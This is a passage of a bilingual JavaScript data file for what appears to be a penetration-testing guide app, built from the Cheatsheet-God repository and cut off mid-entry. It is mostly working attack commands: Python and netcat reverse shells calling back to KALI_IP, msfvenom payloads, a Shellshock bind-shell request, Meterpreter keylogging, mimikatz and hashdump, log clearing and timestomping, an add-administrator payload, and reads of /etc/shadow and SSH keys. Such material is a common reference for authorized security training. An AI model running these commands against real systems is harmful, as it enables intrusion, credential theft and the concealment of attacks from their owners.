// ─── Cheatsheets pratiques — Cheatsheet-God ─────────────────────────────────
// Source : https://github.com/Cheatsheet-God/Cheatsheet-God
// Nœuds extraits des fichiers .txt du repo.

Object.assign(NODES, {

  // ── SHELLS ──────────────────────────────────────────────────────────────────
  "cheat_shells": {
    id: "cheat_shells", title: "Shells — Cheatsheet", title_en: "Shells — Cheatsheet",
    category: "exploit", icon: "🐚",
    description: "Référence complète des reverse shells, bind shells, msfvenom payloads et Shellshock (Cheatsheet-God).",
    description_en: "Complete reference for reverse shells, bind shells, msfvenom payloads, and Shellshock (Cheatsheet-God).",
    commands: [
      { label: "Netcat listener", label_en: "Netcat listener", cmd: "nc -nlvp 4444" },
      { label: "Python reverse shell", label_en: "Python reverse shell", cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
      { label: "Python PTY spawn", label_en: "Python PTY spawn", cmd: "python -c 'import pty; pty.spawn(\"/bin/sh\")'" },
      { label: "Bash reverse shell via SSH (limited shell bypass)", label_en: "Bash reverse shell via SSH (limited shell bypass)", cmd: "ssh user@IP nc LHOST 4444 -e /bin/sh" },
      { label: "Shell via vi/vim", label_en: "Shell via vi/vim", cmd: ":!bash\n# ou\n:set shell=/bin/bash:shell" },
      { label: "Shell via nmap", label_en: "Shell via nmap", cmd: "!sh" },
      { label: "Perl exec shell", label_en: "Perl exec shell", cmd: "perl -e 'exec \"/bin/sh\";'" },
      { label: "busybox telnet shell", label_en: "busybox telnet shell", cmd: "/bin/busybox telnetd -|/bin/sh -p9999" },
      { label: "msfvenom — Linux ELF", label_en: "msfvenom — Linux ELF", cmd: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf" },
      { label: "msfvenom — Windows EXE", label_en: "msfvenom — Windows EXE", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe" },
      { label: "msfvenom — PHP raw", label_en: "msfvenom — PHP raw", cmd: "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php" },
      { label: "msfvenom — ASP", label_en: "msfvenom — ASP", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp" },
      { label: "msfvenom — JSP", label_en: "msfvenom — JSP", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp" },
      { label: "msfvenom — WAR", label_en: "msfvenom — WAR", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war" },
      { label: "msfvenom — Python script", label_en: "msfvenom — Python script", cmd: "msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py" },
      { label: "msfvenom — Bash script", label_en: "msfvenom — Bash script", cmd: "msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh" },
      { label: "MSF multi/handler (générique)", label_en: "MSF multi/handler (generic)", cmd: "use exploit/multi/handler\nset PAYLOAD <payload>\nset LHOST <IP>\nset LPORT <PORT>\nset ExitOnSession false\nexploit -j -z" },
      { label: "Shellshock — test avec nmap", label_en: "Shellshock — test with nmap", cmd: "nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi <IP>" },
      { label: "Shellshock — SSH forced command", label_en: "Shellshock — SSH forced command", cmd: "ssh -i noob noob@IP '() { :;}; /bin/bash'" },
      { label: "Shellshock — bind shell via nc", label_en: "Shellshock — bind shell via nc", cmd: "echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc TARGET 80" }
    ],
    lookfor: [
      "Quel langage est disponible ? Python, Perl, Ruby, PHP, Bash…",
      "TTY disponible ? → stabiliser avec python pty",
      "Port de callback disponible ? → tester 80, 443, 4444",
      "Shellshock : /cgi-bin/ accessible ? User-Agent contrôlable ?"
    ],
    lookfor_en: [
      "Which language is available? Python, Perl, Ruby, PHP, Bash…",
      "TTY available? → stabilize with python pty",
      "Callback port available? → try 80, 443, 4444",
      "Shellshock: /cgi-bin/ accessible? User-Agent controllable?"
    ],
    tips: [
      "Toujours tenter les ports 80 et 443 en sortie : souvent autorisés par le firewall",
      "MSF handler avec ExitOnSession false permet de recevoir plusieurs shells",
      "Pour PHP : ajouter <?php au début du fichier généré par msfvenom",
      "Shell via vi : :!bash fonctionne dans la plupart des contextes"
    ],
    tips_en: [
      "Always try ports 80 and 443 for outbound callbacks: usually allowed by the firewall",
      "MSF handler with ExitOnSession false allows catching multiple shells",
      "For PHP: prepend <?php to the file generated by msfvenom",
      "Shell via vi: :!bash works in most contexts"
    ],
    choices: [
      { label: "Shell obtenu → stabiliser", label_en: "Shell obtained → stabilize", next: "shell_stabilize", icon: "✅" },
      { label: "Accès limité → privesc Linux", label_en: "Limited access → Linux privesc", next: "privesc_linux_enum", icon: "⬆️" },
      { label: "Pivoting depuis ce shell", label_en: "Pivoting from this shell", next: "cheat_pivoting", icon: "🔀" }
    ]
  },

  // ── PIVOTING ────────────────────────────────────────────────────────────────
  "cheat_pivoting": {
    id: "cheat_pivoting", title: "Pivoting — Cheatsheet", title_en: "Pivoting — Cheatsheet",
    category: "network", icon: "🔀",
    description: "Port forwarding, tunneling et proxychains via MSF, SSH, Plink, Socat et Chisel (Cheatsheet-God).",
    description_en: "Port forwarding, tunneling, and proxychains via MSF, SSH, Plink, Socat, and Chisel (Cheatsheet-God).",
    commands: [
      { label: "MSF portfwd — port-to-port", label_en: "MSF portfwd — port-to-port", cmd: "# Depuis meterpreter :\nportfwd add -l 4445 -p 4443 -r 10.1.1.1\n# -R pour reverse" },
      { label: "MSF autoroute + socks4a", label_en: "MSF autoroute + socks4a", cmd: "run post/multi/manage/autoroute\n# ou\nrun autoroute -s 192.168.183.0/24\nuse auxiliary/server/socks4a\nset srvhost 127.0.0.1\nset srvport 1080\nrun" },
      { label: "SSH — tunnel local (-L)", label_en: "SSH — local tunnel (-L)", cmd: "ssh -L 8083:127.0.0.1:8084 user@TARGET\n# Écoute local:8083 → TARGET:8084" },
      { label: "SSH — tunnel remote (-R)", label_en: "SSH — remote tunnel (-R)", cmd: "ssh -R 8081:172.24.0.2:80 user@KALI\n# KALI:8081 ← TARGET:80" },
      { label: "SSH — dynamic SOCKS5 (-D)", label_en: "SSH — dynamic SOCKS5 (-D)", cmd: "ssh -D 127.0.0.1:1080 -N user@TARGET\nproxychains <commande>" },
      { label: "SSH — dans une session existante", label_en: "SSH — within an existing session", cmd: "~C\n-R 8081:172.24.0.2:80" },
      { label: "Plink (Windows) — port forwarding", label_en: "Plink (Windows) — port forwarding", cmd: "plink.exe TARGET_IP -P 22 -C -N -L 0.0.0.0:4445:TARGET_IP:4443 -l KALIUSER -pw PASS" },
      { label: "Plink (Windows) — dynamic SOCKS", label_en: "Plink (Windows) — dynamic SOCKS", cmd: "plink.exe KALI_IP -P 22 -C -N -D 1080 -l KALIUSER -pw PASS" },
      { label: "Socat — forward port-to-port", label_en: "Socat — port-to-port forward", cmd: "./socat TCP4-LISTEN:8083,fork TCP4:DEST_IP:443" },
      { label: "Chisel — serveur Kali (reverse proxy)", label_en: "Chisel — Kali server (reverse proxy)", cmd: "./chisel server -p 8000 --reverse" },
      { label: "Chisel — tunnel remote (accès IP:PORT inaccessible)", label_en: "Chisel — remote tunnel (reach unreachable IP:PORT)", cmd: "# Sur la cible :\n./chisel client KALI_IP:8000 R:127.0.0.1:8001:172.19.0.3:80" },
      { label: "Chisel — SOCKS5 dynamique", label_en: "Chisel — dynamic SOCKS5", cmd: "# Sur la cible :\n./chisel client KALI_IP:8000 R:8001:127.0.0.1:1080\n# Sur Kali :\n./chisel client 127.0.0.1:8001 socks" },
      { label: "Proxychains config (socks5)", label_en: "Proxychains config (socks5)", cmd: "# /etc/proxychains.conf :\nsocks5 127.0.0.1 1080\n# Utilisation :\nproxychains nmap -sT -Pn TARGET" },
      { label: "MSF portscan via route", label_en: "MSF portscan via route", cmd: "use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.183.0/24\nrun" },
      { label: "Générer payload pour cible pivot", label_en: "Generate payload for pivot target", cmd: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALI_PIVOT_IP LPORT=8083 -f elf -o shell" }
    ],
    lookfor: [
      "Interfaces réseau multiples sur la machine compromise ?",
      "Quel outil est disponible : ssh, chisel, socat, plink ?",
      "Port 22 accessible depuis la cible vers Kali ?",
      "proxychains configuré avec le bon port SOCKS ?"
    ],
    lookfor_en: [
      "Multiple network interfaces on the compromised machine?",
      "Which tool is available: ssh, chisel, socat, plink?",
      "Port 22 reachable from target to Kali?",
      "proxychains configured with the correct SOCKS port?"
    ],
    tips: [
      "Pour nmap via proxychains : utiliser -sT -Pn (pas de SYN scan)",
      "Chisel est la méthode la plus polyvalente (fonctionne Linux/Windows)",
      "MSF autoroute + socks4a = pivoting sans binaire supplémentaire",
      "SSH -D 1080 + proxychains permet d'utiliser tous les outils habituels"
    ],
    tips_en: [
      "For nmap via proxychains: use -sT -Pn (no SYN scan)",
      "Chisel is the most versatile method (works on Linux/Windows)",
      "MSF autoroute + socks4a = pivoting without any additional binary",
      "SSH -D 1080 + proxychains lets you use all your regular tools"
    ],
    choices: [
      { label: "Nouveau réseau accessible → scanner", label_en: "New network reachable → scan", next: "start", icon: "🎯" },
      { label: "Cible pivot identifiée → shell", label_en: "Pivot target identified → shell", next: "cheat_shells", icon: "🐚" },
      { label: "Metasploit pour pivoter", label_en: "Metasploit for pivoting", next: "cheat_metasploit", icon: "🎯" }
    ]
  },

  // ── GDB ─────────────────────────────────────────────────────────────────────
  "cheat_gdb": {
    id: "cheat_gdb", title: "GDB — Cheatsheet", title_en: "GDB — Cheatsheet",
    category: "exploit", icon: "🔬",
    description: "Commandes GDB essentielles pour le débogage et l'exploitation de binaires (Cheatsheet-God).",
    description_en: "Essential GDB commands for debugging and binary exploitation (Cheatsheet-God).",
    commands: [
      { label: "Lancer GDB", label_en: "Launch GDB", cmd: "gdb -quiet <binary>\ngdb <binary> core        # analyser core dump\ngdb <binary> <pid>       # attacher au process" },
      { label: "Config intel syntax", label_en: "Set intel syntax", cmd: "set disassembly-flavor intel\n# Mettre dans ~/.gdbinit pour persistance" },
      { label: "Commandes de base", label_en: "Basic commands", cmd: "run                      # lancer le programme\nrun < file               # entrée depuis fichier\ncontinue                 # continuer jusqu'au breakpoint\nfinish                   # exécuter jusqu'à fin de frame\nbacktrace / where        # backtrace de la pile" },
      { label: "Info registers & functions", label_en: "Info registers & functions", cmd: "info registers           # registres courants\ninfo all-registers       # tous les registres\ninfo functions           # liste des fonctions\ninfo variables           # liste des variables\ninfo breakpoints         # liste des breakpoints" },
      { label: "Breakpoints", label_en: "Breakpoints", cmd: "break <func>             # breakpoint sur fonction\nbreak *0xDEADBEEF        # breakpoint sur adresse\ndelete <bnum>            # supprimer breakpoint\nbreak if <cond>          # breakpoint conditionnel\ncondition <bnum> $eax==0x22  # condition sur bnum" },
      { label: "Watchpoints", label_en: "Watchpoints", cmd: "watch variable==value    # break si variable == valeur\nwatch $eax == 0x0000ffaa # break si registre == valeur\nrwatch *0xADDR           # break sur lecture mémoire\nawatch *0xADDR           # break sur lecture/écriture" },
      { label: "Afficher mémoire", label_en: "Examine memory", cmd: "x/20x $esp               # 20 mots hex depuis ESP\nx/s 0xADDR               # afficher string\nx/i $eip                 # afficher instruction courante\ndisplay /5i $eip         # afficher 5 instructions à chaque stop" },
      { label: "Pattern Metasploit (externe)", label_en: "Metasploit pattern (external)", cmd: "msf-pattern_create -l 4000\nmsf-pattern_offset -q <valeur_EIP>" },
      { label: "Hooks GDB", label_en: "GDB hooks", cmd: "define hook-stop\n  info registers\n  x/20x $esp\nend" },
      { label: "Sourcer un script", label_en: "Source a script", cmd: "source script.gdb" }
    ],
    lookfor: [
      "EIP/RIP contrôlé ? → calculer l'offset avec pattern_offset",
      "ESP pointe vers shellcode ? → trouver JMP ESP",
      "Protections activées ? (ASLR, NX, stack canary, PIE)",
      "Bad chars qui corrompent le payload ?"
    ],
    lookfor_en: [
      "EIP/RIP controlled? → calculate offset with pattern_offset",
      "ESP pointing to shellcode? → find JMP ESP",
      "Protections enabled? (ASLR, NX, stack canary, PIE)",
      "Bad chars corrupting the payload?"
    ],
    tips: [
      "Utiliser GEF ou PEDA comme extension GDB pour faciliter le BOF",
      "set args pour tester des arguments sans relancer manuellement",
      "info proc mappings pour voir la disposition mémoire complète",
      "checksec <binary> pour vérifier les protections"
    ],
    tips_en: [
      "Use GEF or PEDA as a GDB extension to streamline BOF exploitation",
      "set args to test arguments without restarting manually",
      "info proc mappings to view the full memory layout",
      "checksec <binary> to verify binary protections"
    ],
    choices: [
      { label: "BOF trouvé → exploit dev", label_en: "BOF found → exploit dev", next: "cheat_exploit_dev", icon: "💥" },
      { label: "Analyse BOF Immunity Debugger", label_en: "BOF analysis with Immunity Debugger", next: "cheat_bof", icon: "🐛" }
    ]
  },

  // ── METASPLOIT ──────────────────────────────────────────────────────────────
  "cheat_metasploit": {
    id: "cheat_metasploit", title: "Metasploit & Meterpreter — Cheatsheet", title_en: "Metasploit & Meterpreter — Cheatsheet",
    category: "exploit", icon: "🎯",
    description: "Commandes MSF/Meterpreter essentielles : modules, post-exploitation, pivoting, keylogging (Cheatsheet-God).",
    description_en: "Essential MSF/Meterpreter commands: modules, post-exploitation, pivoting, keylogging (Cheatsheet-God).",
    commands: [
      { label: "Démarrer MSF", label_en: "Start MSF", cmd: "systemctl start postgresql\nmsfconsole -q" },
      { label: "Rechercher un module", label_en: "Search for a module", cmd: "search type:exploit name:eternal\nsearch type:auxiliary login" },
      { label: "Utiliser un module", label_en: "Use a module", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 10.10.10.10\nexploit" },
      { label: "Base de données MSF", label_en: "MSF database", cmd: "db_nmap -sV -p- TARGET\nhosts\nservices -p 445\nservices -p 445 --rhosts" },
      { label: "Multi/handler générique", label_en: "Generic multi/handler", cmd: "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST <IP>\nset LPORT 443\nset ExitOnSession false\nexploit -j -z" },
      { label: "Meterpreter — info système", label_en: "Meterpreter — system info", cmd: "sysinfo\ngetuid\ngetpid\ngetprivs\nps" },
      { label: "Meterpreter — élévation", label_en: "Meterpreter — privilege escalation", cmd: "getsystem\nhashdump" },
      { label: "Meterpreter — fichiers", label_en: "Meterpreter — files", cmd: "upload /local/file C:\\\\remote\\\\path\ndownload C:\\\\Windows\\\\system32\\\\calc.exe /tmp/\nsearch -f *pass*.txt\nls\npwd" },
      { label: "Meterpreter — shell & migration", label_en: "Meterpreter — shell & migration", cmd: "shell\nmigrate <PID>\nkill <PID>" },
      { label: "Meterpreter — pivoting", label_en: "Meterpreter — pivoting", cmd: "run autoroute -s 192.168.183.0/24\nrun autoroute -p\nportfwd add -l 8001 -p 80 -r PIVOT_IP\n# Puis utiliser auxiliary/server/socks4a" },
      { label: "Meterpreter — keylogger", label_en: "Meterpreter — keylogger", cmd: "keyscan_start\nkeyscan_dump\nkeyscan_stop" },
      { label: "Meterpreter — tokens (incognito)", label_en: "Meterpreter — tokens (incognito)", cmd: "load incognito\nlist_tokens -u\nimpersonate_token 'DOMAIN\\\\Administrator'\ngetuid" },
      { label: "Meterpreter — mimikatz", label_en: "Meterpreter — mimikatz", cmd: "load mimikatz\nwdigest\nmsv\nkerberos" },
      { label: "Meterpreter — clearlog & timestomp", label_en: "Meterpreter — clearlog & timestomp", cmd: "clearev\ntimestomp C:\\\\file.txt -f C:\\\\ref.txt" },
      { label: "Post-exploitation scripts utiles", label_en: "Useful post-exploitation scripts", cmd: "run post/multi/recon/local_exploit_suggester\nrun post/windows/gather/enum_patches\nrun post/windows/gather/enum_logged_on_users\nrun post/linux/gather/checkvm\nrun post/windows/gather/credentials/vnc" },
      { label: "Scanners de brute-force MSF", label_en: "MSF brute-force scanners", cmd: "use auxiliary/scanner/smb/smb_login\nuse auxiliary/scanner/ssh/ssh_login\nuse auxiliary/scanner/ftp/ftp_login\nuse auxiliary/scanner/mysql/mysql_login" }
    ],
    lookfor: [
      "Session meterpreter obtenue ? → getsystem, hashdump",
      "Plusieurs interfaces réseau ? → autoroute + socks",
      "Patch EternalBlue disponible ? → ms17_010",
      "Tokens disponibles ? → incognito pour impersonation"
    ],
    lookfor_en: [
      "Meterpreter session obtained? → getsystem, hashdump",
      "Multiple network interfaces? → autoroute + socks",
      "EternalBlue patch missing? → ms17_010",
      "Tokens available? → incognito for impersonation"
    ],
    tips: [
      "sessions -i <ID> pour interagir avec une session en arrière-plan",
      "background pour passer la session en fond, sessions pour lister",
      "run post/multi/recon/local_exploit_suggester avant tout privesc",
      "msfconsole -r script.rc pour automatiser avec un resource script"
    ],
    tips_en: [
      "sessions -i <ID> to interact with a background session",
      "background to move the session to background, sessions to list them",
      "run post/multi/recon/local_exploit_suggester before any privesc",
      "msfconsole -r script.rc to automate with a resource script"
    ],
    choices: [
      { label: "Meterpreter actif → post-exploitation", label_en: "Active Meterpreter → post-exploitation", next: "cheat_metasploit", icon: "🎯" },
      { label: "Pivoting depuis Meterpreter", label_en: "Pivoting from Meterpreter", next: "cheat_pivoting", icon: "🔀" },
      { label: "Payloads msfvenom", label_en: "msfvenom payloads", next: "cheat_shells", icon: "🐚" },
      { label: "Domain Admin visé", label_en: "Targeting Domain Admin", next: "cheat_domain_admin", icon: "🏰" }
    ]
  },

  // ── WINDOWS ──────────────────────────────────────────────────────────────────
  "cheat_windows": {
    id: "cheat_windows", title: "Windows Pentest — Cheatsheet", title_en: "Windows Pentest — Cheatsheet",
    category: "exploit", icon: "🪟",
    description: "Privesc Windows, GPP, RunAs, WebDAV, CVEs classiques et énumération post-exploitation (Cheatsheet-God).",
    description_en: "Windows privesc, GPP, RunAs, WebDAV, classic CVEs, and post-exploitation enumeration (Cheatsheet-God).",
    commands: [
      { label: "Enumération basique", label_en: "Basic enumeration", cmd: "whoami\nsysteminfo\nnet users\nnet group \"Domain Admins\" /domain\nnetstat -ano\nroute print\narp -A\ntasklist /SVC\nnet start" },
      { label: "Recherche de mots de passe", label_en: "Password search", cmd: "dir /s pass == cred == vnc == .config\nfindstr /si password *.xml *.ini *.txt\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s" },
      { label: "AlwaysInstallElevated (MSI privesc)", label_en: "AlwaysInstallElevated (MSI privesc)", cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated" },
      { label: "GPP — Group Policy Preferences (passwords)", label_en: "GPP — Group Policy Preferences (passwords)", cmd: "net use z:\\\\dc01\\SYSVOL\ndir /s Groups.xml\ntype Groups.xml\ngpp-decrypt <cpassword_hash>" },
      { label: "Trouver le flag proof.txt", label_en: "Find proof.txt flag", cmd: "cd\\ && dir /b /s proof.txt\ntype C:\\path\\to\\proof.txt" },
      { label: "RunAs — exécuter comme autre utilisateur", label_en: "RunAs — execute as another user", cmd: "C:\\Windows\\System32\\runas.exe /env /noprofile /user:Test \"nc.exe -nc KALI_IP 4444 -e cmd.exe\"" },
      { label: "PsExec — exec remote/local", label_en: "PsExec — remote/local exec", cmd: "psexec64 \\\\COMPUTERNAME -u User -p pass -h \"nc.exe -nc KALI_IP 4444 -e cmd.exe\"" },
      { label: "PowerShell RunAs + shell", label_en: "PowerShell RunAs + shell", cmd: "$username='USER'\n$password='PASS'\n$cred=New-Object System.Management.Automation.PSCredential($username,(ConvertTo-SecureString $password -AsPlainText -Force))\nStart-Process nc.exe -Credential $cred -ArgumentList \"-nc KALI_IP 4444 -e cmd.exe\" -NoNewWindow" },
      { label: "PowerShell bypass execution policy", label_en: "PowerShell bypass execution policy", cmd: "powershell -ExecutionPolicy ByPass -command \"& { . C:\\Users\\Public\\script.ps1; Invoke-Function }\"" },
      { label: "ICACLS — check permissions service binary", label_en: "ICACLS — check service binary permissions", cmd: "icacls <service_binary.exe>" },
      { label: "Compile SUID/add user (C cross-compile)", label_en: "Compile add-user payload (C cross-compile)", cmd: "# useradd.c :\n# int main(){system(\"net localgroup administrators hacker /add\");return 0;}\ni686-w64-mingw32-gcc -o adduser.exe useradd.c" },
      { label: "WebDAV + ASPX shell (IIS 6.0)", label_en: "WebDAV + ASPX shell (IIS 6.0)", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f asp > shell.asp\ncadavar http://TARGET\ndav:/> put shell.asp\ndav:/> copy shell.asp shell.asp;.txt" },
      { label: "MS16-032 privesc PowerShell", label_en: "MS16-032 privesc PowerShell", cmd: "powershell -ExecutionPolicy ByPass -command \"& { . C:\\Users\\Public\\Invoke-MS16-032.ps1; Invoke-MS16-032 }\"" }
    ],
    lookfor: [
      "AlwaysInstallElevated activé ? → MSI payload",
      "Groups.xml dans SYSVOL ? → GPP password decrypt",
      "Service binary world-writable ? → remplacer l'exe",
      "Token Administrator disponible ? → impersonate"
    ],
    lookfor_en: [
      "AlwaysInstallElevated enabled? → MSI payload",
      "Groups.xml in SYSVOL? → GPP password decrypt",
      "Service binary world-writable? → replace the exe",
      "Administrator token available? → impersonate"
    ],
    tips: [
      "gpp-decrypt est dans Kali et décrypte les cpassword GPP",
      "Vérifier les unquoted service paths : icacls + sc qc <service>",
      "PowerSploit PowerUp.ps1 pour automatiser l'énumération privesc Windows",
      "Toujours tester getsystem depuis meterpreter en premier"
    ],
    tips_en: [
      "gpp-decrypt is in Kali and decrypts GPP cpassword hashes",
      "Check unquoted service paths: icacls + sc qc <service>",
      "PowerSploit PowerUp.ps1 automates Windows privesc enumeration",
      "Always try getsystem from meterpreter first"
    ],
    choices: [
      { label: "SYSTEM obtenu → dump SAM/hashes", label_en: "SYSTEM obtained → dump SAM/hashes", next: "cheat_metasploit", icon: "🔑" },
      { label: "AD en cible → domain admin", label_en: "AD targeted → domain admin", next: "cheat_domain_admin", icon: "🏰" },
      { label: "Transférer des fichiers", label_en: "Transfer files", next: "cheat_transfer", icon: "📦" }
    ]
  },

  // ── LINUX PENTEST ────────────────────────────────────────────────────────────
  "cheat_linux": {
    id: "cheat_linux", title: "Linux Pentest — Cheatsheet", title_en: "Linux Pentest — Cheatsheet",
    category: "exploit", icon: "🐧",
    description: "Énumération Linux complète, privesc SUID/sudo/cron, shell escape et kernel exploits (Cheatsheet-God).",
    description_en: "Complete Linux enumeration, SUID/sudo/cron privesc, shell escape, and kernel exploits (Cheatsheet-God).",
    commands: [
      { label: "OS & kernel", label_en: "OS & kernel", cmd: "cat /etc/issue\ncat /etc/*-release\nuname -a\ncat /proc/version" },
      { label: "Services running as root", label_en: "Services running as root", cmd: "ps aux | grep root\nps -ef | grep root" },
      { label: "Sudo rights", label_en: "Sudo rights", cmd: "sudo -l\nsudo su" },
      { label: "Fichiers SUID", label_en: "SUID files", cmd: "find / -perm -u=s -type f 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null" },
      { label: "Fichiers SGID", label_en: "SGID files", cmd: "find / -perm -g=s -type f 2>/dev/null" },
      { label: "Dossiers world-writable", label_en: "World-writable directories", cmd: "find / -writable -type d 2>/dev/null\nfind / -perm -222 -type d 2>/dev/null" },
      { label: "Crontabs", label_en: "Crontabs", cmd: "crontab -l\nls -al /etc/cron*\ncat /etc/crontab" },
      { label: "Clés SSH", label_en: "SSH keys", cmd: "cat ~/.ssh/authorized_keys\ncat ~/.ssh/id_rsa\ncat /etc/ssh/sshd_config" },
      { label: "Mots de passe en clair", label_en: "Cleartext passwords", cmd: "grep -i user [filename]\ngrep -i pass [filename]\ngrep -C 5 \"password\" [filename]\ncat ~/.bash_history" },
      { label: "Shadow & passwd", label_en: "Shadow & passwd", cmd: "cat /etc/shadow | grep root\ncat /etc/passwd\ncat /etc/sudoers" },
      { label: "Spawn root via find (sudo)", label_en: "Spawn root via find (sudo)", cmd: "sudo find /home -exec /bin/bash \\;" },
      { label: "Spawn root via Perl (sudo)", label_en: "Spawn root via Perl (sudo)", cmd: "perl -e 'exec \"/bin/bash\";'" },
      { label: "Spawn root via Python (sudo)", label_en: "Spawn root via Python (sudo)", cmd: "python -c 'import pty;pty.spawn(\"/bin/bash\")'" },
      { label: "Spawn root via awk (sudo)", label_en: "Spawn root via awk (sudo)", cmd: "sudo awk 'BEGIN {system(\"/bin/bash\")}'" },
      { label: "Spawn root via socat (sudo)", label_en: "Spawn root via socat (sudo)", cmd: "# Attacker:\nsocat file:`tty`,raw,echo=0 tcp-listen:1234\n# Victime:\nsocat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:KALI_IP:1234" },
      { label: "SUID C shell (compiler)", label_en: "SUID C shell (compile)", cmd: "echo \"int main(void){setresuid(0,0,0);system(\\\"/bin/bash\\\");}\" > suid.c\ngcc -o suid suid.c\nchmod +s suid" },
      { label: "PATH hijacking", label_en: "PATH hijacking", cmd: "set PATH=\"/tmp:/usr/local/bin:/usr/bin:/bin\"\necho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 4444 >/tmp/f\" > /tmp/target_cmd\nchmod +x /tmp/target_cmd" },
      { label: "Dirty Cow (CVE-2016-5195)", label_en: "Dirty Cow (CVE-2016-5195)", cmd: "# Linux Kernel <= 3.19.0-73.8\n# https://dirtycow.ninja/" },
      { label: "Linux Exploit Suggester", label_en: "Linux Exploit Suggester", cmd: "./Linux_Exploit_Suggester.pl -k $(uname -r)" },
      { label: "Trouver le flag", label_en: "Find the flag", cmd: "cat `find / -name proof.txt -print`" }
    ],
    lookfor: [
      "SUID binaires inhabituels (nmap, vim, python, find…) ?",
      "sudo -l : commandes autorisées sans mot de passe ?",
      "Cron job appartenant à root avec script modifiable ?",
      "Variables d'environnement PATH exploitables ?"
    ],
    lookfor_en: [
      "Unusual SUID binaries (nmap, vim, python, find…)?",
      "sudo -l: commands allowed without password?",
      "Cron job owned by root with a writable script?",
      "Exploitable PATH environment variables?"
    ],
    tips: [
      "LinEnum.sh et linux-exploit-suggester automatisent 80% de l'enum",
      "GTFOBins pour chaque binaire SUID/sudo : https://gtfobins.github.io",
      "Dirty Cow fonctionne encore sur de nombreuses vieilles boxes",
      "searchsploit linux 2.6 | grep -i ubuntu | grep local pour le kernel"
    ],
    tips_en: [
      "LinEnum.sh and linux-exploit-suggester automate 80% of enumeration",
      "GTFOBins for each SUID/sudo binary: https://gtfobins.github.io",
      "Dirty Cow still works on many older boxes",
      "searchsploit linux 2.6 | grep -i ubuntu | grep local for kernel exploits"
    ],
    choices: [
      { label: "Root obtenu → flag", label_en: "Root obtained → flag", next: "start", icon: "🏁" },
      { label: "Shell instable → stabiliser", label_en: "Unstable shell → stabilize", next: "shell_stabilize", icon: "✅" },
      { label: "Transfert de fichiers nécessaire", label_en: "File transfer needed", next: "cheat_transfer", icon: "📦" }
    ]
  },

  // ── FILE TRANSFER ────────────────────────────────────────────────────────────
  "cheat_transfer": {
    id: "cheat_transfer", title: "File Upload/Download/Transfer — Cheatsheet", title_en: "File Upload/Download/Transfer — Cheatsheet",
    category: "tool", icon: "📦",
    description: "Toutes les méthodes pour transférer des fichiers entre attaquant et cible (Cheatsheet-God).",
    description_en: "All methods to transfer files between attacker and target (Cheatsheet-God).",
    commands: [
      { label: "Serveur HTTP Python (Kali)", label_en: "Python HTTP server (Kali)", cmd: "python3 -m http.server 80\n# Python2 :\npython -m SimpleHTTPServer 80" },
      { label: "Serveur HTTP PHP", label_en: "PHP HTTP server", cmd: "php -S 0.0.0.0:80" },
      { label: "Serveur HTTP Ruby", label_en: "Ruby HTTP server", cmd: "ruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port=>80,:DocumentRoot=>Dir.pwd).start\"" },
      { label: "wget (Linux download)", label_en: "wget (Linux download)", cmd: "wget http://KALI_IP/file -O /tmp/file" },
      { label: "curl (Linux download)", label_en: "curl (Linux download)", cmd: "curl http://KALI_IP/file -o /tmp/file" },
      { label: "SCP upload/download", label_en: "SCP upload/download", cmd: "scp localfile user@TARGET:~/path/\nscp user@TARGET:~/file /local/" },
      { label: "TFTP (Windows)", label_en: "TFTP (Windows)", cmd: "# Sur Kali :\nmkdir /tftp\natftpd --daemon --port 69 /tftp\ncp /usr/share/windows-binaries/nc.exe /tftp/\n# Sur Windows :\ntftp -i KALI_IP get nc.exe" },
      { label: "VBScript wget (Windows cmd)", label_en: "VBScript wget (Windows cmd)", cmd: "echo Set xHttp=createobject(\"Microsoft.XMLHTTP\") >> dl.vbs\necho Set bStrm=createobject(\"Adodb.Stream\") >> dl.vbs\necho xHttp.Open \"GET\",\"http://KALI_IP/file.exe\",False >> dl.vbs\necho xHttp.Send >> dl.vbs\necho with bStrm >> dl.vbs\necho .type=1 >> dl.vbs\necho .open >> dl.vbs\necho .write xHttp.responseBody >> dl.vbs\necho .savetofile \"C:\\temp\\file.exe\",2 >> dl.vbs\necho end with >> dl.vbs\ncscript dl.vbs" },
      { label: "PowerShell download", label_en: "PowerShell download", cmd: "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file','C:\\temp\\file.exe')\"" },
